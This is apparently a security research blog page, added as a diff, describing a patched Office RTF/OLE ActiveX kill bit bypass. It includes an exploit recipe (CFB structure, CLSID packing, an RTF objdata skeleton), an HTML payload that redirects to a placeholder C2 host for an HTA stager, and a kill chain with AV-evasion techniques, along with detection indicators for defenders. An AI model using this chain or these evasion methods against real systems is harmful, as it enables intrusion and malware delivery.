@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>0-Day Research: Shell.Explorer.1 Kill Bit Bypass | Offensive Security</title>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;900&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="cursor"></div>
+    <div class="cursor-follower"></div>
+    <div class="vignette"></div>
+
+    <nav>
+        <div class="nav-links">
+            <a href="/">MAIN</a>
+            <span class="separator">/</span>
+            <a href="/research.html" class="active">RESEARCH</a>
+            <span class="separator">/</span>
+            <a href="/writeups.html">WRITEUPS</a>
+            <span class="separator">/</span>
+            <a href="/#contact">CONTACT</a>
+        </div>
+    </nav>
+
+    <main class="content-page"
+        style="padding-top: 100px; max-width: 800px; margin: 0 auto; padding-left: 20px; padding-right: 20px;">
+        <article class="article-content" data-aos="fade-up">
+            <h1>0-Day Research: Shell.Explorer.1 Kill Bit Bypass (CVE-2026-21509)</h1>
+            <div class="article-meta">JANUARY 2026 &mdash; VULNERABILITY RESEARCH / INITIAL ACCESS / OLE EXPLOITATION</div>
+
+            <p>While developing initial access capabilities for a custom C2 framework, I identified a weakness in how
+                Microsoft Office handles OLE ActiveX instantiation in RTF documents. The vulnerability allows arbitrary
+                code execution with <strong>zero user interaction</strong> beyond opening the document &mdash; no macros,
+                no "Enable Content" prompt, no kill bit enforcement.</p>
+
+            <p>Microsoft assigned this <strong>CVE-2026-21509</strong> and patched it in the January 2026 security update.</p>
+
+            <h2>The Vulnerability</h2>
+
+            <p>The attack abuses <strong>Shell.Explorer.1</strong>, the WebBrowser ActiveX control
+                (<code>CLSID {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B}</code>), which wraps an embedded Internet Explorer
+                /Trident rendering engine.</p>
+
+            <p>On unpatched Office installations (2016, 2019, LTSC), embedding this control as an OLE object inside an
+                RTF document causes Word to instantiate it <strong>without any security prompt</strong>. The embedded
+                browser engine then processes HTML content stored in the OLE object's <code>Contents</code> stream.
+                A simple <code>&lt;meta http-equiv="refresh"&gt;</code> tag triggers automatic navigation to an
+                attacker-controlled URL.</p>
+
+            <p>This bypasses the COM kill bit mechanism &mdash; a registry-based safety control designed to prevent
+                dangerous ActiveX controls from being instantiated. Shell.Explorer.1 is not flagged by kill bit
+                enforcement on vulnerable Office versions, making this a <strong>kill bit bypass</strong>.</p>
+
+            <h2>Root Cause</h2>
+
+            <p>The vulnerability exists because Office's RTF parser processes <code>\objocx</code> directives and
+                instantiates the referenced ActiveX control before evaluating whether the control should be restricted.
+                The attack flow:</p>
+
+            <ol>
+                <li>RTF document contains an <code>{\object\objocx}</code> directive with class <code>Shell.Explorer.1</code></li>
+                <li>Word parses the <code>\objdata</code> block containing a valid CFB (Compound File Binary) structure</li>
+                <li>The CFB Root Entry carries the Shell.Explorer.1 CLSID</li>
+                <li>Office instantiates the WebBrowser control and feeds it the <code>Contents</code> stream</li>
+                <li>The Trident engine renders the HTML and follows the meta-refresh to an external URL</li>
+                <li>The external URL serves an HTA payload, which <code>mshta.exe</code> executes automatically</li>
+            </ol>
+
+            <p>No VBA, no macros, no user approval. The entire chain fires on document open.</p>
+
+            <h2>Proof of Concept</h2>
+
+            <p>The core of the exploit is constructing a valid OLE2/CFB structure that Office will accept. The CFB must
+                contain four streams with correct formatting:</p>
+
+            <pre><code>Root Entry (CLSID = Shell.Explorer.1)
+├── \x01CompObj    — OLE metadata, user type, ProgID
+├── \x01Ole        — OLE control flags (embedded object)
+├── \x03ObjInfo    — ActiveX control flags (0x1004)
+└── Contents       — HTML with meta-refresh payload</code></pre>
+
+            <p>The CLSID is packed in little-endian format as required by the CFB specification:</p>
+
+            <pre><code>CLSID = struct.pack('&lt;IHH', 0xEAB22AC3, 0x30C1, 0x11CF) \
+      + b'\xa7\xeb\x00\x00\xc0\x5b\xae\x0b'</code></pre>
+
+            <p>The <code>Contents</code> stream contains minimal HTML that triggers the navigation:</p>
+
+            <pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="refresh" content="0;url=https://[C2]/stage.hta"&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+            <p>The CFB is wrapped in an OLE1 container (version <code>0x00000501</code>, format <code>0x00000002</code>
+                for embedded objects), hex-encoded, and placed inside an RTF <code>\objdata</code> block:</p>
+
+            <pre><code>{\object\objocx\objsetsize\objw8000\objh6000
+{\*\objclass Shell.Explorer.1}
+{\*\objdata
+[hex-encoded OLE1 + CFB structure]
+}
+}</code></pre>
+
+            <p>Building the CFB correctly is the most complex part. The structure requires proper sector allocation
+                (FAT chains), a valid directory entry red-black tree, and correct stream sizing. An incorrectly
+                formatted CFB will cause Word to silently reject the object.</p>
+
+            <h2>Weaponization</h2>
+
+            <p>I integrated this vulnerability into a custom C2 framework as one of several initial access vectors.
+                The complete kill chain:</p>
+
+            <pre><code>RTF Document (social-engineered)
+  └─ Shell.Explorer.1 OLE object instantiated (no prompt)
+      └─ Trident engine renders embedded HTML
+          └─ meta-refresh navigates to external HTA
+              └─ mshta.exe executes HTA stager
+                  └─ Stager downloads implant via MSXML2
+                      └─ WMI spawns implant (parent: WmiPrvSE.exe)
+                          └─ Implant injects into explorer.exe
+                              └─ C2 beacon established</code></pre>
+
+            <p>The HTA stager uses several evasion techniques to avoid signature-based detection:</p>
+
+            <ul>
+                <li><strong>String fragmentation</strong> &mdash; all sensitive strings are split via concatenation
+                    (<code>"Scri" &amp; "pting" &amp; ".FileSy" &amp; "stemObj" &amp; "ect"</code>)</li>
+                <li><strong>Chr() encoding</strong> &mdash; critical characters are generated at runtime
+                    (<code>Chr(87)</code> = <code>W</code>)</li>
+                <li><strong>WMI process creation</strong> &mdash; the implant is spawned via
+                    <code>Win32_Process.Create</code>, resulting in <code>WmiPrvSE.exe</code> as the parent process
+                    rather than <code>mshta.exe</code></li>
+                <li><strong>Self-deletion</strong> &mdash; the stager removes itself from disk after execution</li>
+            </ul>
+
+            <p>This vector was deployed alongside traditional macro-based delivery (template injection via
+                <code>.dotm</code> remote templates) and HTML smuggling with ISO sideloading, giving operators
+                flexibility based on target environment hardening.</p>
+
+            <h2>Detection Guidance</h2>
+
+            <p>For defenders and threat intelligence analysts, the key indicators are:</p>
+
+            <ul>
+                <li><strong>RTF documents containing <code>\objocx</code></strong> with class <code>Shell.Explorer.1</code>
+                    &mdash; this combination is almost never legitimate</li>
+                <li><strong>CLSID <code>EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B</code></strong> in embedded OLE objects</li>
+                <li><strong><code>mshta.exe</code> spawned by <code>WINWORD.EXE</code></strong> &mdash; high-confidence
+                    indicator of OLE-based initial access</li>
+                <li><strong>Process lineage</strong>: <code>WINWORD.EXE &rarr; mshta.exe &rarr; WmiPrvSE.exe &rarr;
+                    [implant]</code></li>
+            </ul>
+
+            <p>YARA rules should target the hex-encoded CLSID (<code>C32AB2EAC130CF11A7EB0000C05BAE0B</code>) within
+                RTF <code>\objdata</code> blocks. The combination of <code>\objocx</code> + this CLSID is a reliable
+                signature with minimal false positives.</p>
+
+            <h2>Implications</h2>
+
+            <p>This vulnerability demonstrates that ActiveX-based attack surfaces in Office remain underexplored.
+                Kill bit enforcement is assumed to be a reliable mitigation, but specific controls like
+                Shell.Explorer.1 can slip through when the instantiation path bypasses the standard COM safety
+                checks.</p>
+
+            <p>The zero-interaction requirement makes this particularly dangerous for targeted operations. Unlike
+                macro-based attacks, there is no user decision point &mdash; the payload executes the moment the
+                document is opened. Combined with RTF's plain-text format (which allows trivial obfuscation of the
+                embedded binary data), this creates a reliable initial access vector that evaded major EDR platforms
+                at the time of discovery.</p>
+
+            <p><strong>The tooling described in this post is proprietary.</strong> The C2 framework, RTF generator,
+                and stager infrastructure are available under commercial license for authorized red team
+                engagements.</p>
+
+        </article>
+
+        <footer>
+            <div class="footer-content">
+                <img src="./Image/Logo.jpg" alt="Logo" class="footer-logo">
+                <p class="copyright">&copy; 2024-2026 ALL RIGHTS RESERVED.</p>
+            </div>
+        </footer>
+    </main>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        AOS.init();
+    </script>
+    <script type="module" src="/main.js"></script>
+</body>
+
+</html>
